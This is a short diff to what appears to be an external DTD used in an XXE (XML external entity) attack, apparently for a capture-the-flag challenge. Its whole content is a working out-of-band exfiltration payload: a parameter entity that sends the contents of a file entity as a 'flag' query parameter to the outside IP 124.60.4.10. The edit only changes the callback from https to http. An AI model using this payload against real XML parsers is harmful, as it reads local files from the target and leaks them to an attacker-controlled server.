@@ -1,3 +1,3 @@
 <!ENTITY %run "
-    <!ENTITY &#x25; result SYSTEM 'https://124.60.4.10/?flag=%file;'>
+    <!ENTITY &#x25; result SYSTEM 'http://124.60.4.10/?flag=%file;'>
 "> %run; %result;
